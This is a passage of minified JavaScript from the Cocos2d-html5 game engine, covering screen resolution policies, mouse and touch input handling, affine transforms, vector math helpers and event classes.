            return l > h ? (i = l, n = s * i, r = o) : (i = h, n = c, r = a * i),
            this._buildResult(c, o, n, r, i, i)
        }
    }),
    n = cc.ContentStrategy.extend({
        apply: function(t, e) {
            var i = cc._canvas.width,
            n = cc._canvas.height,
            r = n / e.height;
            return this._buildResult(i, n, i, n, r, r)
        },
        postApply: function(t) {
            cc.director._winSizeInPoints = t.getVisibleSize()
        }
    }),
    r = cc.ContentStrategy.extend({
        apply: function(t, e) {
            var i = cc._canvas.width,
            n = cc._canvas.height,
            r = i / e.width;
            return this._buildResult(i, n, i, n, r, r)
        },
        postApply: function(t) {
            cc.director._winSizeInPoints = t.getVisibleSize()
        }
    });
    cc.ContentStrategy.EXACT_FIT = new t,
    cc.ContentStrategy.SHOW_ALL = new e,
    cc.ContentStrategy.NO_BORDER = new i,
    cc.ContentStrategy.FIXED_HEIGHT = new n,
    cc.ContentStrategy.FIXED_WIDTH = new r
} (), cc.ResolutionPolicy = cc.Class.extend({
    _containerStrategy: null,
    _contentStrategy: null,
    ctor: function(t, e) {
        this.setContainerStrategy(t),
        this.setContentStrategy(e)
    },
    preApply: function(t) {
        this._containerStrategy.preApply(t),
        this._contentStrategy.preApply(t)
    },
    apply: function(t, e) {
        return this._containerStrategy.apply(t, e),
        this._contentStrategy.apply(t, e)
    },
    postApply: function(t) {
        this._containerStrategy.postApply(t),
        this._contentStrategy.postApply(t)
    },
    setContainerStrategy: function(t) {
        t instanceof cc.ContainerStrategy && (this._containerStrategy = t)
    },
    setContentStrategy: function(t) {
        t instanceof cc.ContentStrategy && (this._contentStrategy = t)
    }
}), cc.ResolutionPolicy.EXACT_FIT = 0, cc.ResolutionPolicy.NO_BORDER = 1, cc.ResolutionPolicy.SHOW_ALL = 2, cc.ResolutionPolicy.FIXED_HEIGHT = 3, cc.ResolutionPolicy.FIXED_WIDTH = 4, cc.ResolutionPolicy.UNKNOWN = 5, cc.UIInterfaceOrientationLandscapeLeft = -90, cc.UIInterfaceOrientationLandscapeRight = 90, cc.UIInterfaceOrientationPortraitUpsideDown = 180, cc.UIInterfaceOrientationPortrait = 0, cc.inputManager = {
    _mousePressed: !1,
    _isRegisterEvent: !1,
    _preTouchPoint: cc.p(0, 0),
    _prevMousePoint: cc.p(0, 0),
    _preTouchPool: [],
    _preTouchPoolPointer: 0,
    _touches: [],
    _touchesIntegerDict: {},
    _indexBitsUsed: 0,
    _maxTouches: 5,
    _accelEnabled: !1,
    _accelInterval: 1 / 30,
    _accelMinus: 1,
    _accelCurTime: 0,
    _acceleration: null,
    _accelDeviceEvent: null,
    _getUnUsedIndex: function() {
        for (var t = this._indexBitsUsed,
        e = 0; e < this._maxTouches; e++) {
            if (! (1 & t)) return this._indexBitsUsed |= 1 << e,
            e;
            t >>= 1
        }
        return - 1
    },
    _removeUsedIndexBit: function(t) {
        0 > t || t >= this._maxTouches || (t = ~ (1 << t), this._indexBitsUsed &= t)
    },
    _glView: null,
    handleTouchesBegin: function(t) {
        for (var e, i, n, r = [], c = this._touchesIntegerDict, o = 0, s = t.length; s > o; o++) e = t[o],
        n = e.getID(),
        i = c[n],
        null == i && (i = this._getUnUsedIndex(), -1 == i ? cc.log(cc._LogInfos.inputManager_handleTouchesBegin, i) : (e = this._touches[i] = e, c[n] = i, r.push(e)));
        0 < r.length && (this._glView._convertTouchesWithScale(r), t = new cc.EventTouch(r), t._eventCode = cc.EventTouch.EventCode.BEGAN, cc.eventManager.dispatchEvent(t))
    },
    handleTouchesMove: function(t) {
        for (var e, i, n = [], r = this._touches, c = 0, o = t.length; o > c; c++) e = t[c],
        i = e.getID(),
        i = this._touchesIntegerDict[i],
        null != i && r[i] && (r[i]._setPoint(e._point), r[i]._setPrevPoint(e._prevPoint), n.push(r[i]));
        0 < n.length && (this._glView._convertTouchesWithScale(n), t = new cc.EventTouch(n), t._eventCode = cc.EventTouch.EventCode.MOVED, cc.eventManager.dispatchEvent(t))
    },
    handleTouchesEnd: function(t) {
        t = this.getSetOfTouchesEndOrCancel(t),
        0 < t.length && (this._glView._convertTouchesWithScale(t), t = new cc.EventTouch(t), t._eventCode = cc.EventTouch.EventCode.ENDED, cc.eventManager.dispatchEvent(t))
    },
    handleTouchesCancel: function(t) {
        t = this.getSetOfTouchesEndOrCancel(t),
        0 < t.length && (this._glView._convertTouchesWithScale(t), t = new cc.EventTouch(t), t._eventCode = cc.EventTouch.EventCode.CANCELLED, cc.eventManager.dispatchEvent(t))
    },
    getSetOfTouchesEndOrCancel: function(t) {
        for (var e, i, n, r = [], c = this._touches, o = this._touchesIntegerDict, s = 0, a = t.length; a > s; s++) e = t[s],
        n = e.getID(),
        i = o[n],
        null != i && c[i] && (c[i]._setPoint(e._point), c[i]._setPrevPoint(e._prevPoint), r.push(c[i]), this._removeUsedIndexBit(i), delete o[n]);
        return r
    },
    getHTMLElementPosition: function(t) {
        var e = document.documentElement,
        i = window,
        n = null,
        n = "function" == typeof t.getBoundingClientRect ? t.getBoundingClientRect() : t instanceof HTMLCanvasElement ? {
            left: 0,
            top: 0,
            width: t.width,
            height: t.height
        }: {
            left: 0,
            top: 0,
            width: parseInt(t.style.width),
            height: parseInt(t.style.height)
        };
        return {
            left: n.left + i.pageXOffset - e.clientLeft,
            top: n.top + i.pageYOffset - e.clientTop,
            width: n.width,
            height: n.height
        }
    },
    getPreTouch: function(t) {
        for (var e = null,
        i = this._preTouchPool,
        n = t.getId(), r = i.length - 1; r >= 0; r--) if (i[r].getId() == n) {
            e = i[r];
            break
        }
        return e || (e = t),
        e
    },
    setPreTouch: function(t) {
        for (var e = !1,
        i = this._preTouchPool,
        n = t.getId(), r = i.length - 1; r >= 0; r--) if (i[r].getId() == n) {
            i[r] = t,
            e = !0;
            break
        }
        e || (50 >= i.length ? i.push(t) : (i[this._preTouchPoolPointer] = t, this._preTouchPoolPointer = (this._preTouchPoolPointer + 1) % 50))
    },
    getTouchByXY: function(t, e, i) {
        var n = this._preTouchPoint;
        return t = this._glView.convertToLocationInView(t, e, i),
        e = new cc.Touch(t.x, t.y),
        e._setPrevPoint(n.x, n.y),
        n.x = t.x,
        n.y = t.y,
        e
    },
    getMouseEvent: function(t, e, i) {
        var n = this._prevMousePoint;
        return this._glView._convertMouseToLocationInView(t, e),
        e = new cc.EventMouse(i),
        e.setLocation(t.x, t.y),
        e._setPrevCursor(n.x, n.y),
        n.x = t.x,
        n.y = t.y,
        e
    },
    getPointByEvent: function(t, e) {
        return null != t.pageX ? {
            x: t.pageX,
            y: t.pageY
        }: (e.left -= document.body.scrollLeft, e.top -= document.body.scrollTop, {
            x: t.clientX,
            y: t.clientY
        })
    },
    getTouchesByEvent: function(t, e) {
        for (var i, n, r = [], c = this._glView, o = this._preTouchPoint, s = t.changedTouches.length, a = 0; s > a; a++) if (i = t.changedTouches[a]) {
            var h;
            h = cc.sys.BROWSER_TYPE_FIREFOX === cc.sys.browserType ? c.convertToLocationInView(i.pageX, i.pageY, e) : c.convertToLocationInView(i.clientX, i.clientY, e),
            null != i.identifier ? (i = new cc.Touch(h.x, h.y, i.identifier), n = this.getPreTouch(i).getLocation(), i._setPrevPoint(n.x, n.y), this.setPreTouch(i)) : (i = new cc.Touch(h.x, h.y), i._setPrevPoint(o.x, o.y)),
            o.x = h.x,
            o.y = h.y,
            r.push(i)
        }
        return r
    },
    registerSystemEvent: function(t) {
        if (!this._isRegisterEvent) {
            var e = this._glView = cc.view,
            i = this,
            n = "touches" in cc.sys.capabilities;
            if ("mouse" in cc.sys.capabilities && (cc._addEventListener(window, "mousedown",
            function() {
                i._mousePressed = !0
            },
            !1), cc._addEventListener(window, "mouseup",
            function(e) {
                var r = i._mousePressed;
                if (i._mousePressed = !1, r) {
                    var r = i.getHTMLElementPosition(t),
                    c = i.getPointByEvent(e, r);
                    cc.rectContainsPoint(new cc.Rect(r.left, r.top, r.width, r.height), c) || (n || i.handleTouchesEnd([i.getTouchByXY(c.x, c.y, r)]), r = i.getMouseEvent(c, r, cc.EventMouse.UP), r.setButton(e.button), cc.eventManager.dispatchEvent(r))
                }
            },
            !1), cc._addEventListener(t, "mousedown",
            function(e) {
                i._mousePressed = !0;
                var r = i.getHTMLElementPosition(t),
                c = i.getPointByEvent(e, r);
                n || i.handleTouchesBegin([i.getTouchByXY(c.x, c.y, r)]),
                r = i.getMouseEvent(c, r, cc.EventMouse.DOWN),
                r.setButton(e.button),
                cc.eventManager.dispatchEvent(r),
                e.stopPropagation(),
                e.preventDefault(),
                t.focus()
            },
            !1), cc._addEventListener(t, "mouseup",
            function(e) {
                i._mousePressed = !1;
                var r = i.getHTMLElementPosition(t),
                c = i.getPointByEvent(e, r);
                n || i.handleTouchesEnd([i.getTouchByXY(c.x, c.y, r)]),
                r = i.getMouseEvent(c, r, cc.EventMouse.UP),
                r.setButton(e.button),
                cc.eventManager.dispatchEvent(r),
                e.stopPropagation(),
                e.preventDefault()
            },
            !1), cc._addEventListener(t, "mousemove",
            function(e) {
                var r = i.getHTMLElementPosition(t),
                c = i.getPointByEvent(e, r);
                n || i.handleTouchesMove([i.getTouchByXY(c.x, c.y, r)]),
                r = i.getMouseEvent(c, r, cc.EventMouse.MOVE),
                r.setButton(i._mousePressed ? e.button: null),
                cc.eventManager.dispatchEvent(r),
                e.stopPropagation(),
                e.preventDefault()
            },
            !1), cc._addEventListener(t, "mousewheel",
            function(e) {
                var n = i.getHTMLElementPosition(t),
                r = i.getPointByEvent(e, n),
                n = i.getMouseEvent(r, n, cc.EventMouse.SCROLL);
                n.setButton(e.button),
                n.setScrollData(0, e.wheelDelta),
                cc.eventManager.dispatchEvent(n),
                e.stopPropagation(),
                e.preventDefault()
            },
            !1), cc._addEventListener(t, "DOMMouseScroll",
            function(e) {
                var n = i.getHTMLElementPosition(t),
                r = i.getPointByEvent(e, n),
                n = i.getMouseEvent(r, n, cc.EventMouse.SCROLL);
                n.setButton(e.button),
                n.setScrollData(0, -120 * e.detail),
                cc.eventManager.dispatchEvent(n),
                e.stopPropagation(),
                e.preventDefault()
            },
            !1)), window.navigator.msPointerEnabled) {
                var r, c = {
                    MSPointerDown: i.handleTouchesBegin,
                    MSPointerMove: i.handleTouchesMove,
                    MSPointerUp: i.handleTouchesEnd,
                    MSPointerCancel: i.handleTouchesCancel
                };
                for (r in c)(function(e, n) {
                    cc._addEventListener(t, e,
                    function(e) {
                        var r = i.getHTMLElementPosition(t);
                        r.left -= document.documentElement.scrollLeft,
                        r.top -= document.documentElement.scrollTop,
                        n.call(i, [i.getTouchByXY(e.clientX, e.clientY, r)]),
                        e.stopPropagation()
                    },
                    !1)
                })(r, c[r])
            }
            n && (cc._addEventListener(t, "touchstart",
            function(e) {
                if (e.changedTouches) {
                    var n = i.getHTMLElementPosition(t);
                    n.left -= document.body.scrollLeft,
                    n.top -= document.body.scrollTop,
                    i.handleTouchesBegin(i.getTouchesByEvent(e, n)),
                    e.stopPropagation(),
                    e.preventDefault(),
                    t.focus()
                }
            },
            !1), cc._addEventListener(t, "touchmove",
            function(e) {
                if (e.changedTouches) {
                    var n = i.getHTMLElementPosition(t);
                    n.left -= document.body.scrollLeft,
                    n.top -= document.body.scrollTop,
                    i.handleTouchesMove(i.getTouchesByEvent(e, n)),
                    e.stopPropagation(),
                    e.preventDefault()
                }
            },
            !1), cc._addEventListener(t, "touchend",
            function(e) {
                if (e.changedTouches) {
                    var n = i.getHTMLElementPosition(t);
                    n.left -= document.body.scrollLeft,
                    n.top -= document.body.scrollTop,
                    i.handleTouchesEnd(i.getTouchesByEvent(e, n)),
                    e.stopPropagation(),
                    e.preventDefault()
                }
            },
            !1), cc._addEventListener(t, "touchcancel",
            function(n) {
                if (n.changedTouches) {
                    var r = i.getHTMLElementPosition(t);
                    r.left -= document.body.scrollLeft,
                    r.top -= document.body.scrollTop,
                    e.handleTouchesCancel(i.getTouchesByEvent(n, r)),
                    n.stopPropagation(),
                    n.preventDefault()
                }
            },
            !1)),
            this._registerKeyboardEvent(),
            this._registerAccelerometerEvent(),
            this._isRegisterEvent = !0
        }
    },
    _registerKeyboardEvent: function() {},
    _registerAccelerometerEvent: function() {},
    update: function(t) {
        this._accelCurTime > this._accelInterval && (this._accelCurTime -= this._accelInterval, cc.eventManager.dispatchEvent(new cc.EventAcceleration(this._acceleration))),
        this._accelCurTime += t
    }
},
cc.AffineTransform = function(t, e, i, n, r, c) {
    this.a = t,
    this.b = e,
    this.c = i,
    this.d = n,
    this.tx = r,
    this.ty = c
},
cc.AffineTransformMake = function(t, e, i, n, r, c) {
    return {
        a: t,
        b: e,
        c: i,
        d: n,
        tx: r,
        ty: c
    }
},
cc.PointApplyAffineTransform = function(t, e) {
    return {
        x: e.a * t.x + e.c * t.y + e.tx,
        y: e.b * t.x + e.d * t.y + e.ty
    }
},
cc._PointApplyAffineTransform = function(t, e, i) {
    return {
        x: i.a * t + i.c * e + i.tx,
        y: i.b * t + i.d * e + i.ty
    }
},
cc.SizeApplyAffineTransform = function(t, e) {
    return {
        width: e.a * t.width + e.c * t.height,
        height: e.b * t.width + e.d * t.height
    }
},
cc.AffineTransformMakeIdentity = function() {
    return {
        a: 1,
        b: 0,
        c: 0,
        d: 1,
        tx: 0,
        ty: 0
    }
},
cc.AffineTransformIdentity = function() {
    return {
        a: 1,
        b: 0,
        c: 0,
        d: 1,
        tx: 0,
        ty: 0
    }
},
cc.RectApplyAffineTransform = function(t, e) {
    var i = cc.rectGetMinY(t),
    n = cc.rectGetMinX(t),
    r = cc.rectGetMaxX(t),
    c = cc.rectGetMaxY(t),
    o = cc._PointApplyAffineTransform(n, i, e),
    i = cc._PointApplyAffineTransform(r, i, e),
    n = cc._PointApplyAffineTransform(n, c, e),
    s = cc._PointApplyAffineTransform(r, c, e),
    r = Math.min(o.x, i.x, n.x, s.x),
    c = Math.max(o.x, i.x, n.x, s.x),
    a = Math.min(o.y, i.y, n.y, s.y),
    o = Math.max(o.y, i.y, n.y, s.y);
    return cc.rect(r, a, c - r, o - a)
},
cc._RectApplyAffineTransformIn = function(t, e) {
    var i = cc.rectGetMinY(t),
    n = cc.rectGetMinX(t),
    r = cc.rectGetMaxX(t),
    c = cc.rectGetMaxY(t),
    o = cc._PointApplyAffineTransform(n, i, e),
    i = cc._PointApplyAffineTransform(r, i, e),
    n = cc._PointApplyAffineTransform(n, c, e),
    s = cc._PointApplyAffineTransform(r, c, e),
    r = Math.min(o.x, i.x, n.x, s.x),
    c = Math.max(o.x, i.x, n.x, s.x),
    a = Math.min(o.y, i.y, n.y, s.y),
    o = Math.max(o.y, i.y, n.y, s.y);
    return t.x = r,
    t.y = a,
    t.width = c - r,
    t.height = o - a,
    t
},
cc.AffineTransformTranslate = function(t, e, i) {
    return {
        a: t.a,
        b: t.b,
        c: t.c,
        d: t.d,
        tx: t.tx + t.a * e + t.c * i,
        ty: t.ty + t.b * e + t.d * i
    }
},
cc.AffineTransformScale = function(t, e, i) {
    return {
        a: t.a * e,
        b: t.b * e,
        c: t.c * i,
        d: t.d * i,
        tx: t.tx,
        ty: t.ty
    }
},
cc.AffineTransformRotate = function(t, e) {
    var i = Math.sin(e),
    n = Math.cos(e);
    return {
        a: t.a * n + t.c * i,
        b: t.b * n + t.d * i,
        c: t.c * n - t.a * i,
        d: t.d * n - t.b * i,
        tx: t.tx,
        ty: t.ty
    }
},
cc.AffineTransformConcat = function(t, e) {
    return {
        a: t.a * e.a + t.b * e.c,
        b: t.a * e.b + t.b * e.d,
        c: t.c * e.a + t.d * e.c,
        d: t.c * e.b + t.d * e.d,
        tx: t.tx * e.a + t.ty * e.c + e.tx,
        ty: t.tx * e.b + t.ty * e.d + e.ty
    }
},
cc.AffineTransformEqualToTransform = function(t, e) {
    return t.a === e.a && t.b === e.b && t.c === e.c && t.d === e.d && t.tx === e.tx && t.ty === e.ty
},
cc.AffineTransformInvert = function(t) {
    var e = 1 / (t.a * t.d - t.b * t.c);
    return {
        a: e * t.d,
        b: -e * t.b,
        c: -e * t.c,
        d: e * t.a,
        tx: e * (t.c * t.ty - t.d * t.tx),
        ty: e * (t.b * t.tx - t.a * t.ty)
    }
},
cc.POINT_EPSILON = parseFloat("1.192092896e-07F"), cc.pNeg = function(t) {
    return cc.p( - t.x, -t.y)
},
cc.pAdd = function(t, e) {
    return cc.p(t.x + e.x, t.y + e.y)
},
cc.pSub = function(t, e) {
    return cc.p(t.x - e.x, t.y - e.y)
},
cc.pMult = function(t, e) {
    return cc.p(t.x * e, t.y * e)
},
cc.pMidpoint = function(t, e) {
    return cc.pMult(cc.pAdd(t, e), .5)
},
cc.pDot = function(t, e) {
    return t.x * e.x + t.y * e.y
},
cc.pCross = function(t, e) {
    return t.x * e.y - t.y * e.x
},
cc.pPerp = function(t) {
    return cc.p( - t.y, t.x)
},
cc.pRPerp = function(t) {
    return cc.p(t.y, -t.x)
},
cc.pProject = function(t, e) {
    return cc.pMult(e, cc.pDot(t, e) / cc.pDot(e, e))
},
cc.pRotate = function(t, e) {
    return cc.p(t.x * e.x - t.y * e.y, t.x * e.y + t.y * e.x)
},
cc.pUnrotate = function(t, e) {
    return cc.p(t.x * e.x + t.y * e.y, t.y * e.x - t.x * e.y)
},
cc.pLengthSQ = function(t) {
    return cc.pDot(t, t)
},
cc.pDistanceSQ = function(t, e) {
    return cc.pLengthSQ(cc.pSub(t, e))
},
cc.pLength = function(t) {
    return Math.sqrt(cc.pLengthSQ(t))
},
cc.pDistance = function(t, e) {
    return cc.pLength(cc.pSub(t, e))
},
cc.pNormalize = function(t) {
    return cc.pMult(t, 1 / cc.pLength(t))
},
cc.pForAngle = function(t) {
    return cc.p(Math.cos(t), Math.sin(t))
},
cc.pToAngle = function(t) {
    return Math.atan2(t.y, t.x)
},
cc.clampf = function(t, e, i) {
    if (e > i) {
        var n = e;
        e = i,
        i = n
    }
    return e > t ? e: i > t ? t: i
},
cc.pClamp = function(t, e, i) {
    return cc.p(cc.clampf(t.x, e.x, i.x), cc.clampf(t.y, e.y, i.y))
},
cc.pFromSize = function(t) {
    return cc.p(t.width, t.height)
},
cc.pCompOp = function(t, e) {
    return cc.p(e(t.x), e(t.y))
},
cc.pLerp = function(t, e, i) {
    return cc.pAdd(cc.pMult(t, 1 - i), cc.pMult(e, i))
},
cc.pFuzzyEqual = function(t, e, i) {
    return t.x - i <= e.x && e.x <= t.x + i && t.y - i <= e.y && e.y <= t.y + i ? !0 : !1
},
cc.pCompMult = function(t, e) {
    return cc.p(t.x * e.x, t.y * e.y)
},
cc.pAngleSigned = function(t, e) {
    var i = cc.pNormalize(t),
    n = cc.pNormalize(e),
    i = Math.atan2(i.x * n.y - i.y * n.x, cc.pDot(i, n));
    return Math.abs(i) < cc.POINT_EPSILON ? 0 : i
},
cc.pAngle = function(t, e) {
    var i = Math.acos(cc.pDot(cc.pNormalize(t), cc.pNormalize(e)));
    return Math.abs(i) < cc.POINT_EPSILON ? 0 : i
},
cc.pRotateByAngle = function(t, e, i) {
    t = cc.pSub(t, e);
    var n = Math.cos(i);
    i = Math.sin(i);
    var r = t.x;
    return t.x = r * n - t.y * i + e.x,
    t.y = r * i + t.y * n + e.y,
    t
},
cc.pLineIntersect = function(t, e, i, n, r) {
    if (t.x == e.x && t.y == e.y || i.x == n.x && i.y == n.y) return ! 1;
    var c = e.x - t.x;
    e = e.y - t.y;
    var o = n.x - i.x;
    n = n.y - i.y;
    var s = t.x - i.x;
    return t = t.y - i.y,
    i = n * c - o * e,
    r.x = o * t - n * s,
    r.y = c * t - e * s,
    0 == i ? 0 == r.x || 0 == r.y ? !0 : !1 : (r.x /= i, r.y /= i, !0)
},
cc.pSegmentIntersect = function(t, e, i, n) {
    var r = cc.p(0, 0);
    return cc.pLineIntersect(t, e, i, n, r) && 0 <= r.x && 1 >= r.x && 0 <= r.y && 1 >= r.y ? !0 : !1
},
cc.pIntersectPoint = function(t, e, i, n) {
    var r = cc.p(0, 0);
    return cc.pLineIntersect(t, e, i, n, r) ? (i = cc.p(0, 0), i.x = t.x + r.x * (e.x - t.x), i.y = t.y + r.x * (e.y - t.y), i) : cc.p(0, 0)
},
cc.pSameAs = function(t, e) {
    return null != t && null != e ? t.x == e.x && t.y == e.y: !1
},
cc.pZeroIn = function(t) {
    t.x = 0,
    t.y = 0
},
cc.pIn = function(t, e) {
    t.x = e.x,
    t.y = e.y
},
cc.pMultIn = function(t, e) {
    t.x *= e,
    t.y *= e
},
cc.pSubIn = function(t, e) {
    t.x -= e.x,
    t.y -= e.y
},
cc.pAddIn = function(t, e) {
    t.x += e.x,
    t.y += e.y
},
cc.pNormalizeIn = function(t) {
    cc.pMultIn(t, 1 / Math.sqrt(t.x * t.x + t.y * t.y))
},
cc.Touch = cc.Class.extend({
    _point: null,
    _prevPoint: null,
    _id: 0,
    _startPointCaptured: !1,
    _startPoint: null,
    ctor: function(t, e, i) {
        this._point = cc.p(t || 0, e || 0),
        this._id = i || 0
    },
    getLocation: function() {
        return {
            x: this._point.x,
            y: this._point.y
        }
    },
    getLocationX: function() {
        return this._point.x
    },
    getLocationY: function() {
        return this._point.y
    },
    getPreviousLocation: function() {
        return {
            x: this._prevPoint.x,
            y: this._prevPoint.y
        }
    },
    getStartLocation: function() {
        return {
            x: this._startPoint.x,
            y: this._startPoint.y
        }
    },
    getDelta: function() {
        return cc.pSub(this._point, this._prevPoint)
    },
    getLocationInView: function() {
        return {
            x: this._point.x,
            y: this._point.y
        }
    },
    getPreviousLocationInView: function() {
        return {
            x: this._prevPoint.x,
            y: this._prevPoint.y
        }
    },
    getStartLocationInView: function() {
        return {
            x: this._startPoint.x,
            y: this._startPoint.y
        }
    },
    getID: function() {
        return this._id
    },
    getId: function() {
        return this._id
    },
    setTouchInfo: function(t, e, i) {
        this._prevPoint = this._point,
        this._point = cc.p(e || 0, i || 0),
        this._id = t,
        this._startPointCaptured || (this._startPoint = cc.p(this._point), this._startPointCaptured = !0)
    },
    _setPoint: function(t, e) {
        void 0 === e ? (this._point.x = t.x, this._point.y = t.y) : (this._point.x = t, this._point.y = e)
    },
    _setPrevPoint: function(t, e) {
        this._prevPoint = void 0 === e ? cc.p(t.x, t.y) : cc.p(t || 0, e || 0)
    }
}), cc.Event = cc.Class.extend({
    _type: 0,
    _isStopped: !1,
    _currentTarget: null,
    _setCurrentTarget: function(t) {
        this._currentTarget = t
    },
    ctor: function(t) {
        this._type = t
    },
    getType: function() {
        return this._type
    },
    stopPropagation: function() {
        this._isStopped = !0
    },
    isStopped: function() {
        return this._isStopped
    },
    getCurrentTarget: function() {
        return this._currentTarget
    }
}), cc.Event.TOUCH = 0, cc.Event.KEYBOARD = 1, cc.Event.ACCELERATION = 2, cc.Event.MOUSE = 3, cc.Event.CUSTOM = 4, cc.EventCustom = cc.Event.extend({
    _eventName: null,
    _userData: null,
    ctor: function(t) {
        cc.Event.prototype.ctor.call(this, cc.Event.CUSTOM),
        this._eventName = t
    },
    setUserData: function(t) {
        this._userData = t
    },
    getUserData: function() {
        return this._userData
    },
    getEventName: function() {
        return this._eventName
    }
}), cc.EventMouse = cc.Event.extend({
    _eventType: 0,
    _button: 0,
    _x: 0,
    _y: 0,
    _prevX: 0,
    _prevY: 0,
    _scrollX: 0,
    _scrollY: 0,
    ctor: function(t) {
        cc.Event.prototype.ctor.call(this, cc.Event.MOUSE),
        this._eventType = t
    },
    setScrollData: function(t, e) {
        this._scrollX = t,
        this._scrollY = e
    },
    getScrollX: function() {
        return this._scrollX
    },
    getScrollY: function() {
        return this._scrollY
    },
    setLocation: function(t, e) {
        this._x = t,
        this._y = e
    },
    getLocation: function() {
        return {
            x: this._x,
            y: this._y
        }
    },
    getLocationInView: function() {
        return {
            x: this._x,
            y: cc.view._designResolutionSize.height - this._y
        }
    },
    _setPrevCursor: function(t, e) {
        this._prevX = t,
        this._prevY = e
    },
    getDelta: function() {
        return {
            x: this._x - this._prevX,
            y: this._y - this._prevY
        }
    },
    getDeltaX: function() {
        return this._x - this._prevX
    },
    getDeltaY: function() {
        return this._y - this._prevY
    },
    setButton: function(t) {
        this._button = t
    },
    getButton: function() {
        return this._button
    },
    getLocationX: function() {
        return this._x
    },
    getLocationY: function() {
        return this._y
    }
}), cc.EventMouse.NONE = 0, cc.EventMouse.DOWN = 1, cc.EventMouse.UP = 2, cc.EventMouse.MOVE = 3, cc.EventMouse.SCROLL = 4, cc.EventMouse.BUTTON_LEFT = 0, cc.EventMouse.BUTTON_RIGHT = 2, cc.EventMouse.BUTTON_MIDDLE = 1, cc.EventMouse.BUTTON_4 = 3, cc.EventMouse.BUTTON_5 = 4, cc.EventMouse.BUTTON_6 = 5, cc.EventMouse.BUTTON_7 = 6, cc.EventMouse.BUTTON_8 = 7, cc.EventTouch = cc.Event.extend({
    _eventCode: 0,
    _touches: null,
    ctor: function(t) {
        cc.Event.prototype.ctor.call(this, cc.Event.TOUCH),
        this._touches = t || []
    },
    getEventCode: function() {
        return this._eventCode
    },
    getTouches: function() {
        return this._touches
    },
    _setEventCode: function(t) {
        this._eventCode = t
    },
    _setTouches: function(t) {
        this._touches = t
    }
}), cc.EventTouch.MAX_TOUCHES = 5, cc.EventTouch.EventCode = {
    BEGAN: 0,
    MOVED: 1,
    ENDED: 2,
    CANCELLED: 3
},
cc.EventListener = cc.Class.extend({
    _onEvent: null,
    _type: 0,
    _listenerID: null,
    _registered: !1,
    _fixedPriority: 0,
    _node: null,
    _paused: !1,
    _isEnabled: !0,
    ctor: function(t, e, i) {
        this._onEvent = i,
        this._type = t || 0,
        this._listenerID = e || ""
    },
    _setPaused: function(t) {
        this._paused = t
    },
    _isPaused: function() {
        return this._paused
    },
    _setRegistered: function(t) {
        this._registered = t
    },
    _isRegistered: function() {
        return this._registered
    },
    _getType: function() {
        return this._type
    },
    _getListenerID: function() {
        return this._listenerID
    },
    _setFixedPriority: function(t) {
        this._fixedPriority = t
    },
    _getFixedPriority: function() {
        return this._fixedPriority
    },
    _setSceneGraphPriority: function(t) {
        this._node = t
    },
    _getSceneGraphPriority: function() {
        return this._node
    },
    checkAvailable: function() {
        return null != this._onEvent
    },
    clone: function() {
        return null
    },
    setEnabled: function(t) {
        this._isEnabled = t
    },
    isEnabled: function() {
        return this._isEnabled
    },
    retain: function() {},
    release: function() {}
}), cc.EventListener.UNKNOWN = 0, cc.EventListener.TOUCH_ONE_BY_ONE = 1, cc.EventListener.TOUCH_ALL_AT_ONCE = 2, cc.EventListener.KEYBOARD = 3, cc.EventListener.MOUSE = 4, cc.EventListener.ACCELERATION = 5, cc.EventListener.CUSTOM = 6, cc._EventListenerCustom = cc.EventListener.extend({
    _onCustomEvent: null,
    ctor: function(t, e) {
        this._onCustomEvent = e;
        var i = this;
        cc.EventListener.prototype.ctor.call(this, cc.EventListener.CUSTOM, t,
        function(t) {
            null != i._onCustomEvent && i._onCustomEvent(t)
        })
    },
    checkAvailable: function() {
        return cc.EventListener.prototype.checkAvailable.call(this) && null != this._onCustomEvent
    },
    clone: function() {
        return new cc._EventListenerCustom(this._listenerID, this._onCustomEvent)
    }
